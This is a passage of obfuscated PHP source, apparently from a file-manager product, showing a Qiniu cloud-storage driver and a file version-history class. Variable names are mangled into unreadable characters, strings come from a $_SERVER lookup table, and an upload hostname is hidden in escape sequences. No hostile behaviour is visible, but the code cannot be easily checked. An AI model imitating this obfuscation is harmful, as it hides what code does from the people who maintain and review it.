delByBatch($‡ùî‘©¾) { foreach (array_chunk($‡ùî‘©¾, 1000) as $…¼’ÉçÚ) { $ï®˜Áòİ = $this->bucketManager->buildBatchDelete($this->bucket, $…¼’ÉçÚ); list($ïÄÇÂÛ, $íœÔ·é) = $this->bucketManager->batch($ï®˜Áòİ); if ($íœÔ·é) { return !1; } } return !0; } public function rename($ÓüÎ–¤, $­»Û””’) { return $this->renameObject($ÓüÎ–¤, $­»Û””’); } public function fileInfo($îœ¥É×ˆ, $‚ùÀŒîœ = false, $ñ‰çœ²Ø = array()) { $½¨è™› =& $_SERVER[ñ÷§¡å]; $¬©ó‹–† = array($½¨è™›[32] => $this->pathThis($îœ¥É×ˆ), $½¨è™›[94] => $this->getPathOuter($½¨è™›[8] . $îœ¥É×ˆ), $½¨è™›[33] => $½¨è™›[209], $½¨è™›[86] => isset($ñ‰çœ²Ø[$½¨è™›[1434]]) ? $ñ‰çœ²Ø[$½¨è™›[1434]] : 0, $½¨è™›[184] => $this->ext($îœ¥É×ˆ)); if ($‚ùÀŒîœ) { return $¬©ó‹–†; } $¬©ó‹–†[$½¨è™›[210]] = $¬©ó‹–†[$½¨è™›[95]] = 0; $¬©ó‹–†[$½¨è™›[211]] = $¬©ó‹–†[$½¨è™›[212]] = !0; if (empty($ñ‰çœ²Ø)) { $ñ‰çœ²Ø = $this->objectMeta($îœ¥É×ˆ); if (!$ñ‰çœ²Ø) { return $¬©ó‹–†; } } if (isset($ñ‰çœ²Ø[$½¨è™›[1435]])) { $¬©ó‹–†[$½¨è™›[95]] = substr($ñ‰çœ²Ø[$½¨è™›[1435]] . $½¨è™›[12], 0, 10); } if (isset($ñ‰çœ²Ø[$½¨è™›[1434]])) { $¬©ó‹–†[$½¨è™›[86]] = $ñ‰çœ²Ø[$½¨è™›[1434]]; } return $¬©ó‹–†; } public function folderInfo($Ø‘ñÏ˜, $¸¡ÇÒ‹’ = false) { $“Üêàé =& $_SERVER[ñ÷§¡å]; $ß­î† ´ = array($“Üêàé[32] => $this->pathThis($Ø‘ñÏ˜), $“Üêàé[94] => $this->getPathOuter($“Üêàé[8] . $Ø‘ñÏ˜), $“Üêàé[33] => $“Üêàé[85]); if ($¸¡ÇÒ‹’) { return $ß­î† ´; } $ß­î† ´[$“Üêàé[210]] = $ß­î† ´[$“Üêàé[95]] = 0; $ß­î† ´[$“Üêàé[211]] = $ß­î† ´[$“Üêàé[212]] = !0; $Ø‘ñÏ˜ = rtrim($Ø‘ñÏ˜, $“Üêàé[8]) . $“Üêàé[8]; $‡•Ô‘ë = $this->objectMeta($Ø‘ñÏ˜); if (isset($‡•Ô‘ë[$“Üêàé[1435]])) { $ß­î† ´[$“Üêàé[95]] = substr($‡•Ô‘ë[$“Üêàé[1435]] . $“Üêàé[12], 0, 10); } return $ß­î† ´; } public function listPath($´âÃ™ÂÙ, $°›²éÜ½ = false) { $Ëä’±é• =& $_SERVER[ñ÷§¡å]; $ä¦÷ª™ = $this->fileList($´âÃ™ÂÙ, $Ëä’±é•[8], !0); foreach ($ä¦÷ª™[$Ëä’±é•[92]] as $âøë•ä => $µâ¹³Ì) { $ä¦÷ª™[$Ëä’±é•[92]][$âøë•ä] = $this->folderInfo($µâ¹³Ì, $°›²éÜ½); } foreach ($ä¦÷ª™[$Ëä’±é•[93]] as $âøë•ä => $µâ¹³Ì) { $ä¦÷ª™[$Ëä’±é•[93]][$âøë•ä] = $this->fileInfo($µâ¹³Ì[$Ëä’±é•[104]], $°›²éÜ½, $µâ¹³Ì); } return $ä¦÷ª™; } public function has($ñ±™ì“ı, $Ú¤‚æŒä = false, $ïä–£÷ = true) { $ßıãÖÄé =& $_SERVER[ñ÷§¡å]; $ñ±™ì“ı = trim($ñ±™ì“ı, $ßıãÖÄé[8]); $Òˆ™½š = empty($ñ±™ì“ı) && $ñ±™ì“ı !== $ßıãÖÄé[207] ? $ßıãÖÄé[12] : $ñ±™ì“ı . $ßıãÖÄé[8]; $ÃÈ„—„Ó = $ßıãÖÄé[12]; $í¿‰Ãİ• = 500; $–¤º÷Ü = $ßıãÖÄé[8]; $é¡‘ß‚ = $»Â±Öô = 0; while (!0) { check_abort(); list($±€Œâ§Š, $±†Û½Ğ) = $this->bucketManager->listFiles($this->bucket, $Òˆ™½š, $ÃÈ„—„Ó, $í¿‰Ãİ•, $–¤º÷Ü); if ($±†Û½Ğ) { break; } $ÃÈ„—„Ó = array_key_exists($ßıãÖÄé[1403], $±€Œâ§Š) ? $ÃÈ„—„Ó = $±€Œâ§Š[$ßıãÖÄé[1436]] : $ßıãÖÄé[12]; if ($Ú¤‚æŒä) { if (!empty($±€Œâ§Š[$ßıãÖÄé[1437]])) { $é¡‘ß‚ += count($±€Œâ§Š[$ßıãÖÄé[1437]]); } if (!empty($±€Œâ§Š[$ßıãÖÄé[1438]])) { $»Â±Öô += count($±€Œâ§Š[$ßıãÖÄé[1438]]); } if ($ÃÈ„—„Ó === $ßıãÖÄé[12]) { break; } continue; } if ($ïä–£÷) { if (!empty($±€Œâ§Š[$ßıãÖÄé[1437]])) { return !0; } } else { if (!empty($±€Œâ§Š[$ßıãÖÄé[1438]])) { return !0; } } if ($ÃÈ„—„Ó === $ßıãÖÄé[12]) { break; } } if ($Ú¤‚æŒä) { return array($ßıãÖÄé[217] => $é¡‘ß‚, $ßıãÖÄé[218] => $»Â±Öô); } return !1; } public function listAll($À¦Ê¦©) { $Šô¬İ¸¬ =& $_SERVER[ñ÷§¡å]; $óÖ”˜ö¯ = $this->fileList($À¦Ê¦©, $Šô¬İ¸¬[12], !0); $Ë„—İ¬§ = array(); foreach ($óÖ”˜ö¯[$Šô¬İ¸¬[93]] as $ùêğé¯à) { $Ë„—İ¬§[$ùêğé¯à[$Šô¬İ¸¬[104]]] = $ùêğé¯à[$Šô¬İ¸¬[86]]; } foreach ($óÖ”˜ö¯[$Šô¬İ¸¬[92]] as $ùêğé¯à) { if (is_string($ùêğé¯à)) { $Ë„—İ¬§[$ùêğé¯à] = 0; } } return $this->listAllFiles($À¦Ê¦©, array_keys($Ë„—İ¬§), $Ë„—İ¬§); } private function fileList($„é†´Ä¬, $ä”­¹ÏŒ = '', $İÇ­‹…¯ = 0) { $‡±¤ =& $_SERVER[ñ÷§¡å]; $„é†´Ä¬ = trim($„é†´Ä¬, $‡±¤[8]); $ÔÌ§ğúœ = empty($„é†´Ä¬) && $„é†´Ä¬ !== $‡±¤[207] ? $‡±¤[12] : $„é†´Ä¬ . $‡±¤[8]; $³à¢ëš = $‡±¤[12]; $òÜäêÑ¥ = 1000; $¨ÈËì = $ÕÅóëÓ = array(); while (!0) { check_abort(); list($˜«‡¬Ä½, $¶ğà³³¡) = $this->bucketManager->listFiles($this->bucket, $ÔÌ§ğúœ, $³à¢ëš, $òÜäêÑ¥, $ä”­¹ÏŒ); if ($¶ğà³³¡) { break; } $³à¢ëš = array_key_exists($‡±¤[1403], $˜«‡¬Ä½) ? $³à¢ëš = $˜«‡¬Ä½[$‡±¤[1436]] : $‡±¤[12]; $ˆö ¡ÂÆ = isset($˜«‡¬Ä½[$‡±¤[1437]]) ? $˜«‡¬Ä½[$‡±¤[1437]] : array(); $µğØîÃú = isset($˜«‡¬Ä½[$‡±¤[1438]]) ? $˜«‡¬Ä½[$‡±¤[1438]] : array(); foreach ($ˆö ¡ÂÆ as $Ç€„‘ğ ) { if ($Ç€„‘ğ [$‡±¤[104]] == $ÔÌ§ğúœ) { continue; } $Á’íÆúÁ = $Ç€„‘ğ [$‡±¤[104]]; $¢ëÒğúß = $Ç€„‘ğ [$‡±¤[1434]]; $Ç€„‘ğ [$‡±¤[86]] = $¢ëÒğúß; $Ğà¢èÇÉ = $¢ëÒğúß == 0 && substr($Á’íÆúÁ, strlen($Á’íÆúÁ) - 1, 1) == $‡±¤[8] ? !0 : !1; $this->cacheMethodInfoSet($Á’íÆúÁ, $Ğà¢èÇÉ, $Ç€„‘ğ ); if ($Ğà¢èÇÉ) { $¨ÈËì[] = $Á’íÆúÁ; continue; } $ÕÅóëÓ[] = $İÇ­‹…¯ ? $Ç€„‘ğ  : $Á’íÆúÁ; } foreach ($µğØîÃú as $Á’íÆúÁ) { if ($Á’íÆúÁ == $ÔÌ§ğúœ) { continue; } $¨ÈËì[] = $Á’íÆúÁ; $this->cacheMethodInfoSet($Á’íÆúÁ, !0); } if ($³à¢ëš === $‡±¤[12]) { break; } } $this->cacheMethodInfoSet($„é†´Ä¬, !0); return array($‡±¤[92] => $¨ÈËì, $‡±¤[93] => $ÕÅóëÓ); } public function canRead($ÅãÆæŞï) { return $this->exist($ÅãÆæŞï) ? !0 : !1; } public function canWrite($ŸàÌÈÁ) { return $this->exist($ŸàÌÈÁ) ? !0 : !1; } public function getContent($›ÀƒÌ¾â) { return $this->fileSubstr($›ÀƒÌ¾â, 0, -1); } public function setContent($„†Šúëß, $¥å˜Ï¿å = '') { $úØ«ˆ¾İ = $this->tempFile($this->pathThis($„†Šúëß)); file_put_contents($úØ«ˆ¾İ, $¥å˜Ï¿å); if ($this->upload($„†Šúëß, $úØ«ˆ¾İ)) { $this->tempFileRemve($úØ«ˆ¾İ); return !0; } return !1; } public function refreshUrls($±À±××) { $Á€ô˜É¾ =& $_SERVER[ñ÷§¡å]; $œïÌô—– = array(); if (is_array($±À±××)) { foreach ($±À±×× as $Â‚¾€’ù) { $œïÌô—–[] = $this->link($Â‚¾€’ù); } } else { $œïÌô—–[] = $this->link($±À±××); } $Ø„ÆËÃ® = new Qiniu\Cdn\CdnManager($this->auth); list($ùïùß²ô, $ºãœÑõÚ) = $Ø„ÆËÃ®->refreshUrls($œïÌô—–); if ($ºãœÑõÚ) { return !1; } return $ùïùß²ô[$Á€ô˜É¾[1190]] == $Á€ô˜É¾[773] ? !0 : !1; } public function fileSubstr($·›–ù‡, $˜§ì—©É, $©¦ˆ»²ö) { $ë»¦Î½“ =& $_SERVER[ñ÷§¡å]; if (!($¯öåÚ¥ = $this->link($·›–ù‡))) { return !1; } $ÏÙ¡Ş’¼ = !1; if ($©¦ˆ»²ö > 0) { $Šë¢¾ãÂ = $˜§ì—©É + $©¦ˆ»²ö - 1; $ÏÙ¡Ş’¼ = array($ë»¦Î½“[1439] . $˜§ì—©É . $ë»¦Î½“[395] . $Šë¢¾ãÂ); } $Á¡Òší¹ = url_request($¯öåÚ¥, $ë»¦Î½“[240], !1, $ÏÙ¡Ş’¼); return $Á¡Òší¹[$ë»¦Î½“[763]] ? $Á¡Òší¹[$ë»¦Î½“[1200]] : !1; } public function upload($¨Òğä£ô, $ã©…½¸Ç, $—äÓ³È = false, $İ›ÆÜÄæ = REPEAT_REPLACE) { $÷Æ³…šˆ = new Qiniu\Storage\UploadManager(); $½ôâ®¦É = $this->auth->uploadToken($this->bucket, $¨Òğä£ô); $åÎ½âÎ = get_file_mime(get_path_ext($ã©…½¸Ç)); list($ª£¨ı, $‹éõº·) = $÷Æ³…šˆ->putFile($½ôâ®¦É, $¨Òğä£ô, $ã©…½¸Ç, null, $åÎ½âÎ); return $‹éõº· ? !1 : $this->getPathOuter($¨Òğä£ô); } public function uploadFormData($”Ÿâ¬á…, $ù¼˜èÓÕ = 3600) { return $this->uploadToken($”Ÿâ¬á…, $ù¼˜èÓÕ); } public function multiUploadFormData($ˆşÒ”Ô³, $©ãúÑã­ = 3600) { return $this->uploadToken($ˆşÒ”Ô³, $©ãúÑã­); } private function uploadToken($øäİ¢…, $ş„¿ÂÈ = 3600) { $úÊ«Üã© =& $_SERVER[ñ÷§¡å]; $îÏìéÃÔ = $ş„¿ÂÈ; $ÔŸäáŸë = array($úÊ«Üã©[1440] => $úÊ«Üã©[1441]); $ø‰Ïû»¬ = $øäİ¢…; $øüÑÖ•Î = $this->auth->uploadToken($this->bucket, $ø‰Ïû»¬, $îÏìéÃÔ, $ÔŸäáŸë, !0); $å‘“•—£ = empty($this->region) || $this->region == $úÊ«Üã©[1442] ? $úÊ«Üã©[12] : $úÊ«Üã©[395] . $this->region; $†‡¦‚ = http_type() . "\x3a\57\57\x75\160\154\x6f\141\x64{$å‘“•—£}\x2e\161\x69\x6e\x69\165\160\x2e\143\x6f\x6d\57"; return array($úÊ«Üã©[1443] => $øüÑÖ•Î, $úÊ«Üã©[1444] => $†‡¦‚); } public function download($‡†¦ı¾, $ÂãÓö ö) { $¨®°°ç  = IO::getPathInner(IO::mkfile($ÂãÓö ö)); if (!($”½Æœ… = $this->link($‡†¦ı¾))) { return !1; } $†Õ•íÀÓ = 0; $ö¨³»ê÷ = 1024 * 200; $ÎúŠÒ•Œ = fopen($¨®°°ç , $_SERVER[ñ÷§¡å][1445]); while (!0) { $•¥ê¡ü = $this->fileSubstr($‡†¦ı¾, $†Õ•íÀÓ, $ö¨³»ê÷); if ($•¥ê¡ü === !1) { return !1; } fwrite($ÎúŠÒ•Œ, $•¥ê¡ü); $†Õ•íÀÓ += $ö¨³»ê÷; if (strlen($•¥ê¡ü) < $ö¨³»ê÷) { break; } } fclose($ÎúŠÒ•Œ); return $ÂãÓö ö; } public function link($Ü”÷¬ì, $ ¢ì½Âñ = '') { if (!$this->isFile($Ü”÷¬ì)) { return !1; } $Ô…à«øÜ = $this->getHost() . $_SERVER[ñ÷§¡å][8] . $this->pathEncode($Ü”÷¬ì) . $ ¢ì½Âñ; return $this->auth->privateDownloadUrl($Ô…à«øÜ, 3600 * 12); } public function fileOut($¾ßÂù¤ , $­ÒÃËé = false, $¾€Áæ¿¬ = false, $Ò›Üéş = '') { $Ø£Š®½… =& $_SERVER[ñ÷§¡å]; if ($this->isFileOutServer()) { return $this->fileOutServer($¾ßÂù¤ , $­ÒÃËé, $¾€Áæ¿¬, $Ò›Üéş); } if (!$¾€Áæ¿¬) { $¾€Áæ¿¬ = $this->pathThis($¾ßÂù¤ ); } $óùˆÇà = $­ÒÃËé ? $Ø£Š®½…[1446] . rawurlencode($¾€Áæ¿¬) : $Ø£Š®½…[12]; $¨¿Ÿ¾ÁŒ = $this->link($¾ßÂù¤ , $óùˆÇà); $this->fileOutLink($¨¿Ÿ¾ÁŒ); } public function fileOutServer($»‰‚ŠÇ, $ù–´ï²è = false, $Ù¾‰¡ = false, $Ÿ¦›é¬” = '') { parent::fileOut($»‰‚ŠÇ, $ù–´ï²è, $Ù¾‰¡, $Ÿ¦›é¬”); } public function fileOutImage($ÖÇ×Æ, $ å¯Ô‹â = 250) { $«ÇÊ×„ˆ = $this->link($ÖÇ×Æ, $_SERVER[ñ÷§¡å][1447] . $ å¯Ô‹â); $this->fileOutLink($«ÇÊ×„ˆ); } public function fileOutImageServer($œÜ¼ÁûÏ, $¨²¸óó = 250) { parent::fileOutImage($œÜ¼ÁûÏ, $¨²¸óó); } public function hashMd5($Äü×Ñ¶®) { $•ÈÈßÆÉ =& $_SERVER[ñ÷§¡å]; $Î‹Šñ×‘ = $this->objectMeta($Äü×Ñ¶®); return isset($Î‹Šñ×‘[$•ÈÈßÆÉ[222]]) ? $Î‹Šñ×‘[$•ÈÈßÆÉ[222]] : !1; $Ì¤ŠÆ­— = $this->link($Äü×Ñ¶®, $•ÈÈßÆÉ[1448]); } public function size($”“è°³) { $Ç¹ÑÌÇÛ = $this->objectMeta($”“è°³); return $Ç¹ÑÌÇÛ ? $Ç¹ÑÌÇÛ[$_SERVER[ñ÷§¡å][86]] : 0; } public function info($¹º€øè­) { if ($this->isFolder($¹º€øè­)) { return $this->folderInfo($¹º€øè­); } else { if ($this->isFile($¹º€øè­)) { return $this->fileInfo($¹º€øè­); } } return !1; } public function exist($éÍÃ·ÆÓ) { return $this->isFile($éÍÃ·ÆÓ) || $this->isFolder($éÍÃ·ÆÓ); } public function isFile($Ï¢¸ø®è) { return !$this->isFolder($Ï¢¸ø®è) && $this->objectMeta($Ï¢¸ø®è); } public function isFolder($™½‡üï«) { return $this->cacheMethod($_SERVER[ñ÷§¡å][175], $™½‡üï«); } protected function objectMeta($ß›ÚÏÖú) { return $this->cacheMethod($_SERVER[ñ÷§¡å][177], $ß›ÚÏÖú); } protected function _objectMeta($§éÎé½) { $…£Äã®µ =& $_SERVER[ñ÷§¡å]; list($‹Üš– Ì, $õ£ºÏî«) = $this->bucketManager->stat($this->bucket, $§éÎé½); if ($‹Üš– Ì) { $‹Üš– Ì[$…£Äã®µ[86]] = intval($‹Üš– Ì[$…£Äã®µ[1434]]); } return $‹Üš– Ì; } protected function _isFolder($ÇËåÏîû) { $ØÏéÖ»· =& $_SERVER[ñ÷§¡å]; if ($ÇËåÏîû == $ØÏéÖ»·[12] || $ÇËåÏîû == $ØÏéÖ»·[8]) { return !0; } list($×Ê©şÀ±, $Éàæñ¯) = $this->bucketManager->listFiles($this->bucket, trim($ÇËåÏîû, $ØÏéÖ»·[8]) . $ØÏéÖ»·[8], $ØÏéÖ»·[12], 1, $ØÏéÖ»·[8]); return !empty($×Ê©şÀ±[$ØÏéÖ»·[1437]]) || !empty($×Ê©şÀ±[$ØÏéÖ»·[1438]]) ? !0 : !1; } } goto F­ïİÛ²øµ; Bœ‹•–Âù…: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¡±¯—¤ˆ =& $_SERVER[ñ÷§¡å]; $½Êş¥ = $GLOBALS[$¡±¯—¤ˆ[6]][$¡±¯—¤ˆ[99]]; if ($½Êş¥[$¡±¯—¤ˆ[1215]] != 1) { return; } if ($½Êş¥[$¡±¯—¤ˆ[1216]] <= 0) { return; } if (isset($_REQUEST[$¡±¯—¤ˆ[1217]]) && $_REQUEST[$¡±¯—¤ˆ[1217]] == $¡±¯—¤ˆ[98]) { return; } Hook::bind($¡±¯—¤ˆ[1218], $¡±¯—¤ˆ[1219]); Hook::bind($¡±¯—¤ˆ[1220], $¡±¯—¤ˆ[1221]); Hook::bind($¡±¯—¤ˆ[1222], $¡±¯—¤ˆ[1223]); Hook::bind($¡±¯—¤ˆ[1224], $¡±¯—¤ˆ[1225]); Hook::bind($¡±¯—¤ˆ[1226], $¡±¯—¤ˆ[1227]); Hook::bind($¡±¯—¤ˆ[1228], $¡±¯—¤ˆ[1229]); } public static function eventBeforeUpload($¿›çò) { if ($¿›çò[3] && $¿›çò[3] != REPEAT_REPLACE) { return; } $àşÍÊ¦È = self::parsePath($¿›çò[0]); if (!$àşÍÊ¦È) { return; } self::add($àşÍÊ¦È); } public static function eventBeforeEdit($‡øÚö‘õ) { $¥´ÔöÇı = self::parsePath($‡øÚö‘õ[0]); if (!$¥´ÔöÇı) { return; } self::add($¥´ÔöÇı); } public static function eventBeforeCopyFile($²ÏÑ†òâ, $ôõ¼²í, $Ó‘º—š‡, $Š…üÛ¤ç, $”ìÏ¾Èì, $Š“Àş´ƒ) { $‹Ø’åÈ™ =& $_SERVER[ñ÷§¡å]; if (isset($Ó‘º—š‡->_data[$‹Ø’åÈ™[1162]]) && $Ó‘º—š‡->_data[$‹Ø’åÈ™[1162]]) { return; } $ÎÒµ Şå = $Ó‘º—š‡->getPathOuter($Š…üÛ¤ç); $ÀÎ‡­ƒ¢ = self::parsePath($ÎÒµ Şå); if (!$ÀÎ‡­ƒ¢) { return; } self::add($ÀÎ‡­ƒ¢); } public static function eventBeforeRename($ò·İûäÑ) { $éîõìØ =& $_SERVER[ñ÷§¡å]; $ù¾£Ãêí = self::parsePath($ò·İûäÑ[0]); if (!$ù¾£Ãêí) { return; } $‰Õá¼ñÛ = self::checkInHistory($ù¾£Ãêí); if (!$‰Õá¼ñÛ) { return; } if ($‰Õá¼ñÛ[$éîõìØ[33]] == $éîõìØ[209]) { $×´ÙÎˆ = self::listData($ù¾£Ãêí); if ($×´ÙÎˆ && $×´ÙÎˆ[$éîõìØ[378]]) { self::moveHistory($ù¾£Ãêí, $ò·İûäÑ[1]); } } else { IO::rename($‰Õá¼ñÛ[$éîõìØ[94]], $ò·İûäÑ[1]); } } public static function eventBeforeMove($ß®¬ö±) { $©¨°âúç =& $_SERVER[ñ÷§¡å]; $®Ûƒã¨ = self::parsePath($ß®¬ö±[0]); if (!$®Ûƒã¨) { return; } $¼÷ÒÚ’ª = self::parsePath($ß®¬ö±[1]); if (!$¼÷ÒÚ’ª) { return; } $´¡Ÿ²„Õ = $ß®¬ö±[3]; $òÌ„ÎĞŞ = self::checkInHistory($®Ûƒã¨); if (!$òÌ„ÎĞŞ) { return; } $ˆ’´ş® = self::pathHistory($¼÷ÒÚ’ª); if ($òÌ„ÎĞŞ[$©¨°âúç[33]] == $©¨°âúç[209]) { $¦ö”ÅÓÑ = self::listData($®Ûƒã¨); $àä³„õ = rtrim($¼÷ÒÚ’ª, $©¨°âúç[8]) . $©¨°âúç[8] . ($´¡Ÿ²„Õ ? $´¡Ÿ²„Õ : get_path_this($®Ûƒã¨)); $œ»áÇïâ = self::listData($àä³„õ); if ($¦ö”ÅÓÑ && $¦ö”ÅÓÑ[$©¨°âúç[378]] && $œ»áÇïâ && $œ»áÇïâ[$©¨°âúç[378]]) { return self::clear($®Ûƒã¨); } if ($¦ö”ÅÓÑ && $¦ö”ÅÓÑ[$©¨°âúç[378]]) { self::moveHistory($®Ûƒã¨, $´¡Ÿ²„Õ, $ˆ’´ş®); } } else { IO::move($òÌ„ÎĞŞ[$©¨°âúç[94]], $ˆ’´ş®, !1, $´¡Ÿ²„Õ); self::clearEmptyFolder(IO::pathFather($òÌ„ÎĞŞ[$©¨°âúç[94]])); } } public static function eventAfterRemove($ïûû—Õ¯, $¤éŞÁÁ…) { $ŞĞº¸×¯ =& $_SERVER[ñ÷§¡å]; if (!$¤éŞÁÁ…) { return; } $Û–¿²ô¶ = self::parsePath($ïûû—Õ¯[0]); if (!$Û–¿²ô¶) { return; } $ˆø¥î‘É = self::checkInHistory($Û–¿²ô¶); if (!$ˆø¥î‘É) { return; } if ($ˆø¥î‘É[$ŞĞº¸×¯[33]] == $ŞĞº¸×¯[209]) { $ø„üßŸ¼ = self::listData($Û–¿²ô¶, !1); if ($ø„üßŸ¼ && $ø„üßŸ¼[$ŞĞº¸×¯[378]]) { self::clear($Û–¿²ô¶, !1); } } else { IO::remove($ˆø¥î‘É[$ŞĞº¸×¯[94]]); self::clearEmptyFolder(IO::pathFather($ˆø¥î‘É[$ŞĞº¸×¯[94]])); } } private static function checkInHistory($¶­õÏÌ”) { $Û¿…ÂËğ = self::pathHistory($¶­õÏÌ”); if (!IO::exist($Û¿…ÂËğ)) { $Û¿…ÂËğ .= $_SERVER[ñ÷§¡å][1230]; } return IO::exist($Û¿…ÂËğ) ? IO::info($Û¿…ÂËğ) : !1; } private static function parsePath($ëêÂõÀÇ) { $¬«”Ö¹ =& $_SERVER[ñ÷§¡å]; if (!$ëêÂõÀÇ) { return !1; } if ($GLOBALS[$¬«”Ö¹[1231]]) { return; } $âî‡ÔÈı = KodIO::parse($ëêÂõÀÇ); $ˆæÙœı” = $âî‡ÔÈı[$¬«”Ö¹[33]]; $ÆÒˆÏÍÉ = !$ˆæÙœı” || $ˆæÙœı” == KodIO::KOD_IO || $ˆæÙœı” == KodIO::KOD_SHARE_ITEM; if (!$ÆÒˆÏÍÉ || !$âî‡ÔÈı[$¬«”Ö¹[1232]]) { return !1; } if (substr($ëêÂõÀÇ, 0, strlen(DATA_PATH . $¬«”Ö¹[1233])) == DATA_PATH . $¬«”Ö¹[1233]) { return !1; } if ($ˆæÙœı” == KodIO::KOD_SHARE_ITEM) { $¹°¹ºÒ = IO::init($ëêÂõÀÇ); if ($¹°¹ºÒ->pathParse[$¬«”Ö¹[1158]]) { return self::parsePath($¹°¹ºÒ->pathParse[$¬«”Ö¹[1158]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $²ˆÂ®ñ‘ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¬«”Ö¹[1234]); foreach ($²ˆÂ®ñ‘ as $Ä™•ëÆ‘) { if (!$ˆæÙœı” && substr($ëêÂõÀÇ, 0, strlen($Ä™•ëÆ‘)) == $Ä™•ëÆ‘) { return !1; } } self::log($GLOBALS[$¬«”Ö¹[1153]] . $¬«”Ö¹[1235] . $ëêÂõÀÇ); return $ëêÂõÀÇ; } private static function pathHistory($§¶ŒØá) { $İÌÍ‡îá =& $_SERVER[ñ÷§¡å]; $…ôë¡ÀÜ = self::$_historyBase . ltrim(KodIO::clear($§¶ŒØá), $İÌÍ‡îá[8]); $…ôë¡ÀÜ = str_replace(array($İÌÍ‡îá[1236]), array($İÌÍ‡îá[1237]), $…ôë¡ÀÜ); return $…ôë¡ÀÜ; } public static function log($ƒÌ²Àî‡) { } public static function historyCount($±ÁÚÑå) { $×äòà™é =& $_SERVER[ñ÷§¡å]; $—¯Öëóô = array(); $ŞÕ¯ß½Ë = array(); foreach ($±ÁÚÑå as $áÏ£š»õ) { $ãçç´·¡ = get_path_father($áÏ£š»õ); if (!$ŞÕ¯ß½Ë[$ãçç´·¡]) { $ŞÕ¯ß½Ë[$ãçç´·¡] = array(); } $ŞÕ¯ß½Ë[$ãçç´·¡][] = get_path_this($áÏ£š»õ); } foreach ($ŞÕ¯ß½Ë as $ãçç´·¡ => $¡Ç±Ø• ) { $Ò‹Íœò€ = self::parsePath($ãçç´·¡); if (!$Ò‹Íœò€) { continue; } foreach ($¡Ç±Ø•  as $Òáõµ€Š) { $É¼·Á = self::listData(rtrim($Ò‹Íœò€, $×äòà™é[8]) . $×äòà™é[8] . $Òáõµ€Š, !1); if ($É¼·Á && $É¼·Á[$×äòà™é[378]]) { $—¯Öëóô[rtrim($ãçç´·¡, $×äòà™é[8]) . $×äòà™é[8] . $Òáõµ€Š] = count($É¼·Á[$×äòà™é[378]]); } } } return $—¯Öëóô; } public static function add($ÁàÛÓÜç) { $—•øÎ×Ø =& $_SERVER[ñ÷§¡å]; $Ø¥ÂãÜ = self::listData($ÁàÛÓÜç); if (!$Ø¥ÂãÜ) { return; } $ÌÄİñ‰Ç = Model($—•øÎ×Ø[783])->get($—•øÎ×Ø[1238]); $³€¹Ù·¨ = $GLOBALS[$—•øÎ×Ø[6]][$—•øÎ×Ø[99]][$—•øÎ×Ø[1216]]; $‹¨ï²­Û = $ÌÄİñ‰Ç == $—•øÎ×Ø[1239] ? min(5, $³€¹Ù·¨) : $³€¹Ù·¨; if ($³€¹Ù·¨ <= 0) { return; } $ñ•¥‡Î = IO::info($ÁàÛÓÜç); $¢ğÙùôı = $Ø¥ÂãÜ[$—•øÎ×Ø[378]]; if ($ñ•¥‡Î[$—•øÎ×Ø[86]] == 0) { return; } if ($ñ•¥‡Î[$—•øÎ×Ø[86]] >= 1024 * 1024 * 500) { return !1; } $Ò´ŞŸíÒ = IO::hashSimple($ÁàÛÓÜç); if ($¢ğÙùôı && $¢ğÙùôı[0][$—•øÎ×Ø[187]] == $Ò´ŞŸíÒ) { return !0; } if (array_key_exists($—•øÎ×Ø[212], $ñ•¥‡Î) && !$ñ•¥‡Î[$—•øÎ×Ø[212]]) { return !1; } $ÇÍß…ÖÄ = short_id(time()); $œèõ³è¯ = array($—•øÎ×Ø[408] => $ÇÍß…ÖÄ, $—•øÎ×Ø[187] => $Ò´ŞŸíÒ, $—•øÎ×Ø[32] => $ñ•¥‡Î[$—•øÎ×Ø[32]] . $—•øÎ×Ø[10] . date($—•øÎ×Ø[1240]) . rand_string(1), $—•øÎ×Ø[86] => $ñ•¥‡Î[$—•øÎ×Ø[86]], $—•øÎ×Ø[463] => USER_ID, $—•øÎ×Ø[210] => time(), $—•øÎ×Ø[1241] => $—•øÎ×Ø[12]); IO::mkdir($Ø¥ÂãÜ[$—•øÎ×Ø[1242]]); $ş•è†» = IO::copy($ÁàÛÓÜç, $Ø¥ÂãÜ[$—•øÎ×Ø[1242]], !1, $œèõ³è¯[$—•øÎ×Ø[32]]); if (!$ş•è†») { self::clearEmptyFolder($Ø¥ÂãÜ[$—•øÎ×Ø[1242]]); return !1; } array_unshift($¢ğÙùôı, $œèõ³è¯); if (count($¢ğÙùôı) > $‹¨ï²­Û) { $á¬¡•¯î = array_slice($¢ğÙùôı, $‹¨ï²­Û); foreach ($á¬¡•¯î as $¿ğ²°Ã) { IO::remove($Ø¥ÂãÜ[$—•øÎ×Ø[1242]] . $¿ğ²°Ã[$—•øÎ×Ø[32]]); } $¢ğÙùôı = array_slice($¢ğÙùôı, 0, $‹¨ï²­Û); } return self::saveData($Ø¥ÂãÜ[$—•øÎ×Ø[1243]], $¢ğÙùôı); } public static function remove($ÜÌËæ¡, $å½Ûî…) { $Âô’û€± =& $_SERVER[ñ÷§¡å]; $²Ü¶æÂ = self::listData($ÜÌËæ¡); $‡ó¸‘è¬ = array(); if (!$²Ü¶æÂ) { return !1; } foreach ($²Ü¶æÂ[$Âô’û€±[378]] as $™Û’Ø¯ğ) { if ($™Û’Ø¯ğ[$Âô’û€±[408]] == $å½Ûî…) { IO::remove($²Ü¶æÂ[$Âô’û€±[1242]] . $™Û’Ø¯ğ[$Âô’û€±[32]]); continue; } $‡ó¸‘è¬[] = $™Û’Ø¯ğ; } return self::saveData($²Ü¶æÂ[$Âô’û€±[1243]], $‡ó¸‘è¬); } public static function clear($æÕ÷Õ²‹, $¿ÄÓœÚÊ = true) { $Óèæş½ =& $_SERVER[ñ÷§¡å]; $¹Ğ¸¾ò = self::listData($æÕ÷Õ²‹, $¿ÄÓœÚÊ); if (!$¹Ğ¸¾ò) { return !1; } foreach ($¹Ğ¸¾ò[$Óèæş½[378]] as $Ç”©÷ä) { IO::remove($¹Ğ¸¾ò[$Óèæş½[1242]] . $Ç”©÷ä[$Óèæş½[32]]); } return self::saveData($¹Ğ¸¾ò[$Óèæş½[1243]], array()); } public static function moveHistory($¿Á‘÷”¡, $…Ã‡‹’„ = '', $Ê†¡Œä = '') { $è¡ÚÓÃú =& $_SERVER[ñ÷§¡å]; $‹ÊŸ°À 